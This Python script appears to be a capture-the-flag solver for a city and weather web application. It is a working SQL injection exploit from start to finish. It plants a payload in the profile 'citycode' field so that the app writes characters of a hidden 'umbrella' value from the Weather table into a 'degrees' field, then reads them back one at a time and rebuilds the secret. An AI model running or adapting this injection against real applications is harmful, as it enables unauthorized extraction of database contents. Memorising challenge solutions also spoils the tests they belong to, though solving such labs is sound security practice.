#!/usr/bin/env python3
from requests import *
import sys

result_string = []

s = Session()

def create(s, cityname, citycode):
    res = s.post(f'http://{sys.argv[1]}:{sys.argv[2]}/create',data={"cityname": cityname,"citycode": citycode})
    print(res.text)

def vistit(s ,cityname, citycode):
    res = s.post(f'http://{sys.argv[1]}:{sys.argv[2]}/visit',data={"cityname": cityname,"citycode": citycode})
    print(res.text)
    print(res.json().get('degrees'))


def changecitycode(s, exploitdata):
    s.post(f'http://{sys.argv[1]}:{sys.argv[2]}/profile/citycode',data={"citycode": exploitdata})
    s.get(f'http://{sys.argv[1]}:{sys.argv[2]}/profile#') # updater fix degrees


def getDegrees(s):
    result = s.get(f'http://{sys.argv[1]}:{sys.argv[2]}/profile/get',
                        headers={
                            "Content-Type": "multipart/form-data"
                        })
    degrees = result.json().get('degrees')
    degrees_str = str(chr(int(degrees)))
    return degrees_str

def exploit():
    create(s, cityname="studentcity", citycode="1234567890")
    i = 0
    while True:
        vistit(s, cityname="studentcity", citycode="1234567890")
        changecitycode(s, exploitdata=f"1234567890', degrees=(SELECT ASCII(substring(umbrella, {i+1}, 1)) FROM Weather limit 1 offset 2)--")
        vistit(s, cityname="studentcity", citycode="1234567890")
        degrees = getDegrees(s)
        if degrees == '\x00':
            break
        result_string.append(degrees)
        i+=1

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("python3 solver.py host port")
    else: 
        exploit()
        print("".join(result_string))